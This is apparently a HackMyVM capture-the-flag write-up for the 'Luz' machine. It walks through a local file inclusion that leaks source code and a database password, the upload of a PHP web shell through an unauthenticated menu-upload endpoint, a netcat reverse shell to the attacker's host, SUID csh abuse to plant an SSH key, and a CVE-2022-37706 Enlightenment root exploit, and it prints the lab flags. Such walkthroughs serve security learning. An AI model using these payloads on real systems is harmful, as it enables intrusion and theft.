# Luz

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.192:22
Open 10.0.2.192:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.192
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:9e:28:74:86:8e:d7:5b:bd:96:00:4b:d0:7f:56:e3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJdeakQuX/KhgJtCHKPXBvbBberybpFXyJCNY133fb6wXIblN9C0KqbjlK9F7dky5mhp2dvFNhQp7OyRp26Oq60=
|   256 fb:3b:fd:9c:9f:4a:7c:8c:1e:a8:27:e2:8d:bf:2b:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOse0b6oOXfVJOgCDyK93vOjbOlyMHaQyfx5V5aFOaor
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/luz/writeup.png)

### LFI

I confirmed that LFI exists via using `/proc/self/cwd/PAGENAME`, however `.php` is added at the end and is somewhat restricted
- [http://10.0.2.192/index.php?page=/proc/self/cwd/about](http://10.0.2.192/index.php?page=/proc/self/cwd/about)

We can still read existing PHP files
```php
└─$ curl 'http://10.0.2.192/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect' -s | html2markdown | grep -E '.{100,}' | base64 -d | sed -n '/<?php/,/?>/p'
<?php

$conn= new mysqli('localhost','root','mypazz1','fos')or die("Could not connect to mysql".mysqli_error($con));
```

```php
└─$ curl 'http://10.0.2.192/index.php?page=php://filter/convert.base64-encode/resource=admin/login' -s | html2markdown | grep -E '.{100,}' | base64 -d | sed -n '/<?php/,/?>/p'
<?php include('./header.php'); ?>
<?php include('./db_connect.php'); ?>
<?php
session_start();
if(isset($_SESSION['login_id']))
header("location:index.php?page=home");

$query = $conn->query("SELECT * FROM system_settings limit 1")->fetch_array();
		foreach ($query as $key => $value) {
			if(!is_numeric($key))
				$_SESSION['setting_'.$key] = $value;
		}
?>
```

If you click `Login` Javascript form pops up and you input email/password, the request is sent to `ajax.php` and this file uses `admin_class` for CRUD actions. These methods are interesting:
```php
└─$ curl 'http://10.0.2.192/index.php?page=php://filter/convert.base64-encode/resource=admin/admin_class' -s | html2markdown | grep -E '.{100,}' | base64 -d | sed -n '/<?php/,/?>/p'
<?php
session_start();
class Action {
    <snip>
    function login() {
        extract($_POST);
        $qry = $this->db->query("SELECT * FROM `users` where username = '" . $username . "' ");
        if ($qry->num_rows > 0) {
            $result = $qry->fetch_array();
            $is_verified = password_verify($password, $result["password"]);
            if ($is_verified) {
                foreach ($result as $key => $value) {
                    if ($key != "password" && !is_numeric($key)) {
                        $_SESSION["login_" . $key] = $value;
                    }
                }
                return 1;
            }
        }
        return 3;
    }
    <snip>
    function save_user() {
        extract($_POST);
        $password = password_hash($password, PASSWORD_DEFAULT);
        $data  = " `name` = '$name' ";
        $data .= ", `username` = '$username' ";
        $data .= ", `password` = '$password' ";
        $data .= ", `type` = '$type' ";
        if (empty($id)) { $save = $this->db->query("INSERT INTO users set " . $data); } 
        else { $save = $this->db->query("UPDATE users set " . $data . " where id = " . $id); }
        if ($save) { return 1; }
    }
    <snip>
    function save_menu() {
        extract($_POST);
        $data = " name = '$name' ";
        $data .= ", price = '$price' ";
        $data .= ", category_id = '$category_id' ";
        $data .= ", description = '$description' ";
        if (isset($status) && $status == "on") {
            $data .= ", status = 1 ";
        } else {
            $data .= ", status = 0 ";
        }

        if ($_FILES["img"]["tmp_name"] != "") {
            $fname = strtotime(date("y-m-d H:i")) . "_" . $_FILES["img"]["name"];
            $move = move_uploaded_file(
                $_FILES["img"]["tmp_name"],
                "../assets/img/" . $fname
            );
            $data .= ", img_path = '$fname' ";
        }
        if (empty($id)) {
            $save = $this->db->query("INSERT INTO product_list set " . $data);
        } else {
            $save = $this->db->query("UPDATE product_list set " . $data . " where id=" . $id);
        }
        if ($save) {
            return 1;
        }
    } 
    <snip>
}
```

### RCE

The `save_menu` has unauthenticated unrestricted upload capability!
```bash
└─$ echo '<?php if(isset($_REQUEST[0])) { echo @exec($_REQUEST[0]); } ?>' >> hi.php
└─$ curl 'http://10.0.2.192/admin/ajax.php?action=save_menu' -F 'name=hi' -F 'price=10.99' -F 'category_id=1' -F 'description=letmein' -F 'img=@hi.php'
```

```bash
└─$ curl 'http://10.0.2.192/' -s | htmlq img -a src
...
assets/img/1768310820_hi.php
...
└─$ curl 'http://10.0.2.192/assets/img/1768310820_hi.php' -d '0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl 'http://10.0.2.192/assets/img/1768310820_hi.php' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@luz:~/html/fos/assets/img$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### User.txt

```bash
www-data@luz:~/html$ cat user.txt
HMVn03145n4nk4
```

## Lateral Movement

```bash
www-data@luz:~/html/fos$ find / -perm -4000 -ls 2>/dev/null
     1456     36 -rwsr-xr--   1 root     messagebus    35112 Apr  1  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    54488     24 -rwsr-xr-x   1 root     root          22840 Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
    54493     60 -rwsr-xr-x   1 root     root          59712 Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system
    54492     24 -rwsr-xr-x   1 root     root          22832 Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
    14183    332 -rwsr-xr-x   1 root     root         338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
     9441     20 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
      945     32 -rwsr-xr-x   1 root     root          30872 Feb 26  2022 /usr/bin/pkexec
      923     60 -rwsr-xr-x   1 root     root          59976 Mar 14  2022 /usr/bin/passwd
      889     40 -rwsr-xr-x   1 root     root          40496 Mar 14  2022 /usr/bin/newgrp
     1234     36 -rwsr-xr-x   1 root     root          35192 Feb 21  2022 /usr/bin/umount
      744     72 -rwsr-xr-x   1 root     root          72072 Mar 14  2022 /usr/bin/gpasswd
     1159    228 -rwsr-xr-x   1 root     root         232408 Feb 14  2022 /usr/bin/sudo
     1158     56 -rwsr-xr-x   1 root     root          55672 Feb 21  2022 /usr/bin/su
      877     48 -rwsr-xr-x   1 root     root          47480 Feb 21  2022 /usr/bin/mount
      614     72 -rwsr-xr-x   1 root     root          72712 Mar 14  2022 /usr/bin/chfn
      620     44 -rwsr-xr-x   1 root     root          44808 Mar 14  2022 /usr/bin/chsh
      798    168 -rwsr-sr-x   1 aelis    aelis        170608 Oct 26  2021 /usr/bin/bsd-csh
      728     36 -rwsr-xr-x   1 root     root          35200 Mar 23  2022 /usr/bin/fusermount3
```

- [https://gtfobins.github.io/gtfobins/csh/#suid](https://gtfobins.github.io/gtfobins/csh/#suid)

```bash
└─$ gen_ssh_deploy id_rsa aelis
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/aelis/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz7mZPPnvnAJ6pO30xvRnPIMimX0oci0zdao3QgVKWT woyag@kraken' >> /home/aelis/.ssh/authorized_keys; chmod 700 /home/aelis/.ssh; chmod 600 /home/aelis/.ssh/authorized_keys
```

```bash
www-data@luz:~/html/fos$ csh -b
% id
uid=33(www-data) gid=33(www-data) euid=1000(aelis) egid=1000(aelis) groups=1000(aelis),33(www-data)
% GEN_SSH_DEPLOY_COMMAND
```

```bash
└─$ ssh -i id_rsa aelis@10.0.2.191
aelis@luz:~$ id
uid=1000(aelis) gid=1000(aelis) groups=1000(aelis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
```

## Privilege Escalation

`aelis` user has application served on port 80, so useless.
```bash
aelis@luz:~$ unzip php-fos-db.zip
aelis@luz:~/fos/database$ diff fos_db.sql /var/www/html/fos/database/fos_db.sql
```

There were `SUID` files related to **enlightenment**
```bash
aelis@luz:~$ enlightenment --version
Version: 0.25.3
```

```bash
└─$ searchsploit 'enlightenment'
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Enlightenment - Linux Null PTR Dereference Framework        | linux/local/9627.txt
Enlightenment v0.25.3 - Privilege escalation                | linux/local/51180.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

- [CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main)

Dump in terminal
```bash
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),1000(aelis)
```

### Root.txt

```bash
# cat /root/root.txt
HMV3nl1gth3nm3n7
```